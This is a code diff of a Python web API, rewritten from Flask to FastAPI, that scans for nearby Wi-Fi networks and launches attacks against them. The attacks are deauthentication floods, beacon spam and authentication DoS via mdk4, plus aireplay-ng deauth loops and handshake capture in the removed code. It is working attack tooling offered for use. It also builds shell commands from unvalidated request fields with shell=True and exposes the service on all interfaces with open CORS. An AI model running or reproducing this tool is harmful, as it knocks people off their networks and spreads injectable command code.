@@ -1,143 +1,165 @@
-from flask import Flask, render_template, request, jsonify
+from fastapi import FastAPI, HTTPException
+from fastapi.responses import JSONResponse
+from fastapi.middleware.cors import CORSMiddleware
+from fastapi.templating import Jinja2Templates
+from fastapi.requests import Request
+from pydantic import BaseModel
+from typing import List, Optional
 import subprocess
 import os
 import time
 import signal
 import sys
-import re
-import atexit
 import glob
 import threading
-import json
+import tempfile
+import uvicorn
+import logging
 
-app = Flask(__name__)
+# ====================== SETUP ======================
+app = FastAPI(title="MDK4 Web API", version="1.0")
 
-# Variabel global
-monitor_iface = None
-original_iface = None
-attack_processes = {"sniff": None, "deauth": None}
-deauth_thread = None
-deauth_running = False
-current_target = None
+# CORS
+app.add_middleware(
+    CORSMiddleware,
+    allow_origins=["*"],
+    allow_credentials=True,
+    allow_methods=["*"],
+    allow_headers=["*"],
+)
 
-# ====================== FUNGSI MANAJEMEN INTERFACE ======================
+# Templates
+templates = Jinja2Templates(directory="templates")
 
+# Logging
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
+
+# ====================== MODELS ======================
+class Target(BaseModel):
+    bssid: str
+    channel: str
+    essid: str
+    power: Optional[int] = None
+
+class AttackRequest(BaseModel):
+    type: str
+    targets: List[Target] = []
+    interface: str
+
+class MonitorData(BaseModel):
+    clients: List[dict] = []
+    ap_status: str = "unknown"
+    packets_sent: int = 0
+    last_update: Optional[float] = None
+
+# ====================== STATE ======================
+class AttackState:
+    def __init__(self):
+        self.process = None
+        self.running = False
+        self.type = None
+        self.targets = []
+        self.monitor_thread = None
+        self.monitor_running = False
+        self.monitor_data = MonitorData()
+        self.monitor_iface = None
+        self.original_iface = None
+        self.temp_files = []
+
+state = AttackState()
+
+# ====================== INTERFACE FUNCTIONS ======================
 def find_wireless_interfaces():
-    result = subprocess.run(["iwconfig"], capture_output=True, text=True)
-    lines = result.stdout.split('\n')
-    interfaces = []
-    for line in lines:
-        if "no wireless extensions" in line:
-            continue
-        if line.strip() and not line.startswith(" "):
-            iface = line.split()[0]
-            if iface not in ["lo", "eth0", "eth1"]:
-                interfaces.append(iface)
-    return interfaces
+    try:
+        result = subprocess.run(["iwconfig"], capture_output=True, text=True, timeout=5)
+        lines = result.stdout.split('\n')
+        interfaces = []
+        for line in lines:
+            if "no wireless extensions" in line or not line.strip():
+                continue
+            if not line.startswith(" "):
+                iface = line.split()[0]
+                if iface not in ["lo", "eth0", "eth1"]:
+                    interfaces.append(iface)
+        return interfaces
+    except Exception as e:
+        logger.error(f"Error finding interfaces: {e}")
+        return []
 
 def is_monitor_mode(iface):
-    result = subprocess.run(["iwconfig", iface], capture_output=True, text=True)
-    return "Mode:Monitor" in result.stdout
-
-def start_monitor_mode(iface):
-    print(f"[*] Starting monitor mode on {iface}...")
-    subprocess.run(["sudo", "airmon-ng", "check", "kill"], check=False)
-    result = subprocess.run(["sudo", "airmon-ng", "start", iface], capture_output=True, text=True)
-    for line in result.stdout.split('\n'):
-        if "monitor mode enabled on" in line:
-            parts = line.split()
-            for i, part in enumerate(parts):
-                if part == "on" and i+1 < len(parts):
-                    new_iface = parts[i+1].strip()
-                    print(f"[+] Monitor interface: {new_iface}")
-                    return new_iface
-    interfaces = find_wireless_interfaces()
-    for i in interfaces:
-        if "mon" in i and i != iface:
-            print(f"[+] Found monitor interface: {i}")
-            return i
-    raise RuntimeError("Could not determine monitor interface name")
-
-def stop_monitor_mode(iface):
-    if iface and iface != original_iface:
-        print(f"[*] Stopping monitor mode on {iface}...")
-        subprocess.run(["sudo", "airmon-ng", "stop", iface], check=False)
-    print("[*] Restarting NetworkManager...")
-    subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], check=False)
-
-def ensure_monitor_mode():
-    global monitor_iface, original_iface
-    interfaces = find_wireless_interfaces()
-    for iface in interfaces:
-        if is_monitor_mode(iface):
-            monitor_iface = iface
-            print(f"[+] Found existing monitor interface: {monitor_iface}")
-            return monitor_iface
-    for iface in interfaces:
-        if not is_monitor_mode(iface) and not iface.startswith("mon"):
-            original_iface = iface
-            try:
-                new_iface = start_monitor_mode(iface)
-                monitor_iface = new_iface
-                print(f"[+] Successfully created monitor interface: {monitor_iface}")
-                return monitor_iface
-            except Exception as e:
-                print(f"[-] Failed to start monitor on {iface}: {e}")
-                continue
-    raise RuntimeError("No wireless interface available")
-
-def get_monitor_interface():
-    global monitor_iface
-    if monitor_iface and is_monitor_mode(monitor_iface):
-        return monitor_iface
-    interfaces = find_wireless_interfaces()
-    for iface in interfaces:
-        if is_monitor_mode(iface):
-            monitor_iface = iface
-            return monitor_iface
-    return ensure_monitor_mode()
-
-def set_channel(iface, channel):
     try:
-        subprocess.run(["iwconfig", iface, "channel", str(channel)], check=True, capture_output=True)
-        return True
+        result = subprocess.run(["iwconfig", iface], capture_output=True, text=True, timeout=3)
+        return "Mode:Monitor" in result.stdout
     except:
         return False
 
-# ====================== SIGNAL STRENGTH ======================
+def get_monitor_interface():
+    if state.monitor_iface and is_monitor_mode(state.monitor_iface):
+        return state.monitor_iface
+    
+    interfaces = find_wireless_interfaces()
+    for iface in interfaces:
+        if is_monitor_mode(iface):
+            state.monitor_iface = iface
+            return iface
+    
+    # Try create monitor
+    for iface in interfaces:
+        if not iface.startswith("mon"):
+            try:
+                subprocess.run(["sudo", "airmon-ng", "check", "kill"], check=False, timeout=5)
+                result = subprocess.run(
+                    ["sudo", "airmon-ng", "start", iface], 
+                    capture_output=True, text=True, timeout=10
+                )
+                for line in result.stdout.split('\n'):
+                    if "monitor mode enabled on" in line:
+                        parts = line.split()
+                        for i, part in enumerate(parts):
+                            if part == "on" and i+1 < len(parts):
+                                new_iface = parts[i+1].strip()
+                                state.monitor_iface = new_iface
+                                return new_iface
+            except Exception as e:
+                logger.error(f"Failed to create monitor: {e}")
+                continue
+    
+    raise Exception("No monitor interface available")
 
-def get_signal_level(power):
-    """Konversi dBm ke kategori"""
-    if power is None:
-        return "Almost Hilang"
-    if power > -50:
-        return "Kuat"
-    elif power > -70:
-        return "Sedang"
-    elif power > -85:
-        return "Lemah"
-    else:
-        return "Almost Hilang"
+def cleanup_monitor():
+    if state.monitor_iface:
+        try:
+            subprocess.run(["sudo", "airmon-ng", "stop", state.monitor_iface], check=False, timeout=5)
+            subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], check=False, timeout=5)
+        except:
+            pass
 
 # ====================== PARSE CSV ======================
-
 def parse_csv(filename):
-    """Parse airodump-ng CSV output file, extract BSSID, channel, ESSID, dan Power"""
-    networks = []
+    networks, clients = [], []
     try:
         with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
             lines = f.readlines()
-    except FileNotFoundError:
-        return networks
-
-    start_parsing = False
-    for i, line in enumerate(lines):
-        if "bssid" in line.lower() and "channel" in line.lower() and "essid" in line.lower():
-            start_parsing = True
+    except:
+        return networks, clients
+    
+    parsing_networks = False
+    parsing_clients = False
+    
+    for line in lines:
+        if "bssid" in line.lower() and "channel" in line.lower():
+            parsing_networks = True
+            parsing_clients = False
             continue
-        if start_parsing:
-            if line.strip() == "" or "station mac" in line.lower():
-                break
+        if "station mac" in line.lower():
+            parsing_networks = False
+            parsing_clients = True
+            continue
+        if not line.strip():
+            continue
+        
+        if parsing_networks:
             parts = line.split(',')
             if len(parts) >= 14:
                 bssid = parts[0].strip()
@@ -153,249 +175,314 @@ def parse_csv(filename):
                         "bssid": bssid,
                         "channel": channel if channel else "?",
                         "essid": essid if essid else "[Hidden]",
-                        "power": power,
-                        "signal_level": get_signal_level(power)
+                        "power": power
+                    })
+            
+        if parsing_clients:
+            parts = line.split(',')
+            if len(parts) >= 6:
+                bssid = parts[0].strip()
+                station = parts[1].strip() if len(parts) > 1 else ""
+                power = parts[2].strip() if len(parts) > 2 else ""
+                if bssid and len(bssid) == 17 and ":" in bssid:
+                    clients.append({
+                        "bssid": bssid,
+                        "station": station,
+                        "power": power
+                    })
+    
+    return networks, clients
+
+def parse_csv_scan(filename):
+    networks = []
+    try:
+        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
+            lines = f.readlines()
+    except:
+        return networks
+    
+    start = False
+    for line in lines:
+        if "bssid" in line.lower() and "channel" in line.lower():
+            start = True
+            continue
+        if start:
+            if not line.strip() or "station mac" in line.lower():
+                break
+            parts = line.split(',')
+            if len(parts) >= 14:
+                bssid = parts[0].strip()
+                if bssid and len(bssid) == 17 and ":" in bssid:
+                    networks.append({
+                        "bssid": bssid,
+                        "channel": parts[3].strip() if len(parts) > 3 else "?",
+                        "essid": parts[13].strip() if len(parts) > 13 else "[Hidden]",
+                        "power": int(parts[8].strip()) if len(parts) > 8 and parts[8].strip().lstrip('-').isdigit() else None
                     })
     return networks
 
-# ====================== ROUTE SCAN ======================
+# ====================== MONITOR THREAD ======================
+def monitor_loop():
+    logger.info("Monitor thread started")
+    state.monitor_running = True
+    
+    while state.monitor_running:
+        try:
+            if not state.targets:
+                time.sleep(2)
+                continue
+            
+            target = state.targets[0]
+            bssid = target.get('bssid')
+            if not bssid:
+                time.sleep(2)
+                continue
+            
+            temp_file = "/tmp/monitor_output"
+            cmd = f"sudo timeout 3 airodump-ng {state.monitor_iface} --bssid {bssid} -w {temp_file} --output-format csv 2>/dev/null"
+            subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
+            
+            csv_file = f"{temp_file}-01.csv"
+            if os.path.exists(csv_file):
+                _, clients = parse_csv(csv_file)
+                state.monitor_data.clients = clients
+                state.monitor_data.last_update = time.time()
+                state.monitor_data.ap_status = "online" if clients else "⚠️ AP OFFLINE"
+                try:
+                    os.remove(csv_file)
+                except:
+                    pass
+            
+        except Exception as e:
+            logger.error(f"Monitor error: {e}")
+        
+        time.sleep(3)
 
-@app.route('/scan', methods=['GET'])
-def scan_wifi():
+# ====================== HELPER FUNCTIONS ======================
+def find_ssid_file():
+    script_dir = os.path.dirname(os.path.abspath(__file__))
+    paths = [
+        os.path.join(script_dir, "ssid-fake", "ssid_list.txt"),
+        os.path.join(script_dir, "ssid_list.txt"),
+    ]
+    for path in paths:
+        if os.path.exists(path):
+            return path
+    return None
+
+def stop_attack_internal():
+    logger.info("Stopping attack...")
+    state.running = False
+    
+    # Stop monitor
+    state.monitor_running = False
+    if state.monitor_thread and state.monitor_thread.is_alive():
+        try:
+            state.monitor_thread.join(timeout=3)
+        except:
+            pass
+        state.monitor_thread = None
+    
+    # Kill process
+    if state.process:
+        try:
+            if state.process.poll() is None:
+                os.killpg(os.getpgid(state.process.pid), signal.SIGTERM)
+                state.process.wait(timeout=3)
+        except:
+            pass
+        state.process = None
+    
+    # Pkill
+    try:
+        subprocess.run("sudo pkill -f mdk4", shell=True, check=False, timeout=5)
+    except:
+        subprocess.run("sudo pkill -9 -f mdk4", shell=True, check=False)
+    
+    # Clean temp files
+    for f in state.temp_files:
+        try:
+            os.remove(f)
+        except:
+            pass
+    state.temp_files = []
+    
+    # Reset
+    state.monitor_data = MonitorData()
+    state.targets = []
+    
+    logger.info("Attack stopped")
+
+# ====================== API ROUTES ======================
+
+@app.get("/")
+async def root(request: Request):
+    return templates.TemplateResponse("index.html", {"request": request})
+
+@app.get("/api/interfaces")
+async def get_interfaces():
+    try:
+        interfaces = find_wireless_interfaces()
+        monitor = get_monitor_interface() if interfaces else None
+        return {
+            "status": "success",
+            "interfaces": interfaces,
+            "monitor": monitor
+        }
+    except Exception as e:
+        logger.error(f"Interfaces error: {e}")
+        return JSONResponse(
+            status_code=500,
+            content={"status": "error", "message": str(e)}
+        )
+
+@app.get("/api/scan")
+async def scan_networks(duration: int = 10):
     try:
         interface = get_monitor_interface()
-        print(f"[*] Scanning with {interface}...")
+        logger.info(f"Scanning with {interface}")
         
+        # Clean old files
         for f in glob.glob("/tmp/scan_output*.csv"):
             try:
                 os.remove(f)
             except:
                 pass
         
-        cmd = f"timeout 12 sudo airodump-ng {interface} -w /tmp/scan_output --output-format csv"
-        subprocess.run(cmd, shell=True, capture_output=True, text=True)
+        # Run scan
+        cmd = f"timeout {duration+2} sudo airodump-ng {interface} -w /tmp/scan_output --output-format csv"
+        subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=duration+5)
         
-        possible_files = [
-            "/tmp/scan_output-01.csv",
-            "/tmp/scan_output-02.csv",
-            "/tmp/scan_output-03.csv",
-            "/tmp/scan_output.csv"
-        ]
-        
+        # Parse results
         networks = []
-        for f in possible_files:
+        for f in ["/tmp/scan_output-01.csv", "/tmp/scan_output.csv"]:
             if os.path.exists(f):
-                print(f"[*] Parsing file: {f}")
-                networks = parse_csv(f)
+                networks = parse_csv_scan(f)
                 if networks:
                     break
         
         if networks:
-            networks.sort(key=lambda x: x['power'] if x['power'] is not None else -1000, reverse=True)
-            print(f"[+] Found {len(networks)} networks")
-            return jsonify({"status": "success", "networks": networks})
+            networks.sort(key=lambda x: x.get('power', -1000), reverse=True)
+            return {"status": "success", "networks": networks}
         else:
-            print("[*] No networks found in CSV, using fallback method...")
-            cmd2 = f"timeout 8 sudo airodump-ng {interface} 2>/dev/null | grep -E '^[0-9A-F]' | head -20"
-            result2 = subprocess.run(cmd2, shell=True, capture_output=True, text=True)
-            lines = result2.stdout.split('\n')
-            for line in lines:
-                parts = line.split()
-                if len(parts) >= 7:
-                    bssid = parts[0]
-                    channel = parts[2] if len(parts) > 2 else "?"
-                    essid = " ".join(parts[6:]) if len(parts) > 6 else "[Hidden]"
-                    if bssid and len(bssid) == 17 and ":" in bssid:
-                        networks.append({
-                            "bssid": bssid,
-                            "channel": channel,
-                            "essid": essid,
-                            "power": None,
-                            "signal_level": "Almost Hilang"
-                        })
-            networks.sort(key=lambda x: x['power'] if x['power'] is not None else -1000, reverse=True)
-            return jsonify({"status": "success", "networks": networks})
+            return {"status": "error", "message": "No networks found"}
             
     except Exception as e:
-        print(f"[-] Error during scan: {e}")
-        return jsonify({"status": "error", "message": str(e)})
+        logger.error(f"Scan error: {e}")
+        return JSONResponse(
+            status_code=500,
+            content={"status": "error", "message": str(e)}
+        )
 
-# ====================== ROUTES SERANGAN ======================
-
-@app.route('/')
-def index():
-    return render_template('index.html')
-
-@app.route('/start_sniff', methods=['POST'])
-def start_sniff():
-    data = request.json
-    bssid = data.get('bssid')
-    channel = data.get('channel')
-    interface = get_monitor_interface()
-    if not interface:
-        return jsonify({"status": "error", "message": "Monitor interface not found"})
-    
-    stop_sniff_process()
-    cmd = f"sudo airodump-ng -c {channel} --bssid {bssid} -w captured_handshake {interface}"
-    process = subprocess.Popen(cmd, shell=True, preexec_fn=os.setsid)
-    attack_processes["sniff"] = process
-    return jsonify({"status": "success", "message": f"Sniffing started on {bssid}"})
-
-@app.route('/stop_sniff', methods=['POST'])
-def stop_sniff():
-    stop_sniff_process()
-    return jsonify({"status": "success", "message": "Sniffing stopped"})
-
-def stop_sniff_process():
-    if attack_processes["sniff"]:
-        os.killpg(os.getpgid(attack_processes["sniff"].pid), signal.SIGTERM)
-        attack_processes["sniff"] = None
-
-# ====================== DEAUTH OPTIMIZED - 10 PACKETS PER SECOND ======================
-
-def deauth_loop_single(target, interface):
-    """
-    Deauth loop optimized:
-    - 10 paket per detik (2 burst x 5 paket)
-    - Ringan di CPU VM
-    - Tetap efektif memutuskan koneksi
-    """
-    global deauth_running, current_target
-    bssid = target['bssid']
-    channel = target['channel']
-    essid = target.get('essid', 'Unknown')
-    
-    print(f"[*] Starting deauth on {bssid} (CH {channel}) - {essid}")
-    print(f"[*] Rate: 10 packets/second (2 bursts x 5 packets)")
-    
-    # Set channel ke target
-    set_channel(interface, channel)
-    
-    # Statistik
-    packet_count = 0
-    attack_rounds = 0
-    start_time = time.time()
-    
-    # Konfigurasi: 10 paket/detik
-    BURST_SIZE = 5      # 5 paket per burst
-    BURSTS_PER_SECOND = 2  # 2 burst per detik = 10 paket/detik
-    
-    while deauth_running:
-        attack_rounds += 1
+@app.post("/api/attack/start")
+async def start_attack(req: AttackRequest):
+    try:
+        if state.running:
+            raise HTTPException(status_code=400, detail="Attack already running")
         
-        # Kirim burst 1
-        cmd1 = f"sudo aireplay-ng --deauth {BURST_SIZE} -a {bssid} {interface}"
-        try:
-            subprocess.run(cmd1, shell=True, timeout=1, capture_output=True, text=True)
-            packet_count += BURST_SIZE
-        except subprocess.TimeoutExpired:
-            pass
-        except Exception as e:
-            print(f"[-] Error in deauth burst 1: {e}")
+        if not req.interface:
+            raise HTTPException(status_code=400, detail="No interface selected")
         
-        # Cek apakah masih running
-        if not deauth_running:
-            break
+        if not req.type:
+            raise HTTPException(status_code=400, detail="No attack type selected")
         
-        # Delay 0.5 detik (setengah detik)
-        time.sleep(0.5)
+        # Build command
+        cmd = None
+        if req.type == "deauth":
+            if req.targets:
+                target_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt')
+                for target in req.targets:
+                    target_file.write(f"{target.bssid},{target.channel}\n")
+                target_file.close()
+                state.temp_files.append(target_file.name)
+                cmd = ["sudo", "mdk4", req.interface, "d", "-B", target_file.name, "-c", "h", "-s", "500"]
+                state.targets = [t.dict() for t in req.targets]
+            else:
+                cmd = ["sudo", "mdk4", req.interface, "d", "-c", "h", "-s", "500"]
+                state.targets = []
+                
+        elif req.type == "beacon":
+            ssid_file = find_ssid_file()
+            if not ssid_file:
+                raise HTTPException(status_code=400, detail="ssid_list.txt not found in ssid-fake folder")
+            cmd = ["sudo", "mdk4", req.interface, "b", "-f", ssid_file, "-w", "a", "-m", "-s", "500"]
+            state.targets = []
+            
+        elif req.type == "authdos":
+            if not req.targets:
+                raise HTTPException(status_code=400, detail="Auth DOS needs 1 target")
+            target = req.targets[0]
+            cmd = ["sudo", "mdk4", req.interface, "a", "-a", target.bssid, "-s", "1000"]
+            state.targets = [target.dict()]
         
-        # Kirim burst 2
-        cmd2 = f"sudo aireplay-ng --deauth {BURST_SIZE} -a {bssid} {interface}"
-        try:
-            subprocess.run(cmd2, shell=True, timeout=1, capture_output=True, text=True)
-            packet_count += BURST_SIZE
-        except subprocess.TimeoutExpired:
-            pass
-        except Exception as e:
-            print(f"[-] Error in deauth burst 2: {e}")
+        if not cmd:
+            raise HTTPException(status_code=400, detail="Invalid attack type")
         
-        # Delay 0.5 detik lagi (total 1 detik per cycle)
-        time.sleep(0.5)
+        # Start process
+        logger.info(f"Starting: {' '.join(cmd)}")
+        state.process = subprocess.Popen(cmd, preexec_fn=os.setsid)
+        state.running = True
+        state.type = req.type
         
-        # Log setiap 10 cycle (10 detik)
-        if attack_rounds % 10 == 0:
-            elapsed = time.time() - start_time
-            avg_rate = packet_count / elapsed if elapsed > 0 else 0
-            print(f"[*] Cycle {attack_rounds} | Total packets: {packet_count} | Rate: {avg_rate:.1f} pkts/sec")
-    
-    elapsed = time.time() - start_time
-    avg_rate = packet_count / elapsed if elapsed > 0 else 0
-    print(f"[*] Deauth stopped. Total: {packet_count} packets in {elapsed:.1f}s ({avg_rate:.1f} pkts/sec)")
+        # Start monitor
+        if state.targets:
+            if state.monitor_thread is None or not state.monitor_thread.is_alive():
+                state.monitor_thread = threading.Thread(target=monitor_loop)
+                state.monitor_thread.daemon = True
+                state.monitor_thread.start()
+        
+        return {
+            "status": "success",
+            "message": f"{req.type} attack started",
+            "targets": len(state.targets)
+        }
+        
+    except HTTPException:
+        raise
+    except Exception as e:
+        logger.error(f"Start error: {e}")
+        return JSONResponse(
+            status_code=500,
+            content={"status": "error", "message": str(e)}
+        )
 
-@app.route('/start_deauth', methods=['POST'])
-def start_deauth():
-    global deauth_thread, deauth_running, current_target
-    data = request.json
-    targets = data.get('targets')
-    
-    if not targets or len(targets) == 0:
-        return jsonify({"status": "error", "message": "No targets selected"})
-    
-    # Ambil target pertama saja (single target)
-    target = targets[0]
-    current_target = target
-    
-    interface = get_monitor_interface()
-    if not interface:
-        return jsonify({"status": "error", "message": "Monitor interface not found"})
-    
-    # Stop deauth yang sedang berjalan
-    stop_deauth_process()
-    
-    # Start deauth baru
-    deauth_running = True
-    deauth_thread = threading.Thread(target=deauth_loop_single, args=(target, interface))
-    deauth_thread.daemon = True
-    deauth_thread.start()
-    
-    return jsonify({
-        "status": "success", 
-        "message": f"Deauth started on {target['bssid']} (CH {target['channel']}) - 10 packets/sec",
-        "target": target
-    })
+@app.post("/api/attack/stop")
+async def stop_attack():
+    try:
+        stop_attack_internal()
+        return {"status": "success", "message": "Attack stopped"}
+    except Exception as e:
+        logger.error(f"Stop error: {e}")
+        return JSONResponse(
+            status_code=500,
+            content={"status": "error", "message": str(e)}
+        )
 
-@app.route('/stop_deauth', methods=['POST'])
-def stop_deauth():
-    stop_deauth_process()
-    return jsonify({"status": "success", "message": "Deauth stopped"})
+@app.get("/api/attack/status")
+async def attack_status():
+    return {
+        "running": state.running,
+        "type": state.type,
+        "targets": state.targets,
+        "target_count": len(state.targets)
+    }
 
-def stop_deauth_process():
-    global deauth_running, deauth_thread, current_target
-    deauth_running = False
-    if deauth_thread and deauth_thread.is_alive():
-        deauth_thread.join(timeout=3)
-    deauth_thread = None
-    current_target = None
-    
-    # Matikan semua proses aireplay-ng yang mungkin masih berjalan
-    subprocess.run("sudo pkill -f 'aireplay-ng --deauth'", shell=True, check=False)
-
-# ====================== GET CURRENT TARGET ======================
-
-@app.route('/current_target', methods=['GET'])
-def get_current_target():
-    global current_target
-    if current_target and deauth_running:
-        return jsonify({
-            "status": "running",
-            "target": current_target
-        })
-    else:
-        return jsonify({
-            "status": "idle",
-            "target": None
-        })
+@app.get("/api/monitor")
+async def get_monitor():
+    return {
+        "status": "success",
+        "data": state.monitor_data.dict()
+    }
 
 # ====================== CLEANUP ======================
-
 def cleanup():
-    print("\n[*] Cleaning up...")
-    stop_sniff_process()
-    stop_deauth_process()
-    if monitor_iface:
-        stop_monitor_mode(monitor_iface)
-    print("[+] Cleanup complete.")
+    logger.info("Cleaning up...")
+    try:
+        stop_attack_internal()
+        cleanup_monitor()
+    except Exception as e:
+        logger.error(f"Cleanup error: {e}")
+    logger.info("Cleanup complete")
 
 def signal_handler(sig, frame):
     cleanup()
@@ -403,17 +490,14 @@ def signal_handler(sig, frame):
 
 signal.signal(signal.SIGINT, signal_handler)
 signal.signal(signal.SIGTERM, signal_handler)
-atexit.register(cleanup)
 
 # ====================== MAIN ======================
-
-if __name__ == '__main__':
+if __name__ == "__main__":
     try:
-        ensure_monitor_mode()
-        print(f"[*] Monitor interface ready: {monitor_iface}")
-        print("[*] Starting Flask server on 0.0.0.0:5000 ...")
-        app.run(host='0.0.0.0', port=5000, debug=False)
+        get_monitor_interface()
+        logger.info(f"Monitor interface: {state.monitor_iface}")
+        uvicorn.run(app, host="0.0.0.0", port=5000, log_level="info")
     except Exception as e:
-        print(f"[-] Fatal error: {e}")
+        logger.error(f"Fatal error: {e}")
         cleanup()
         sys.exit(1)
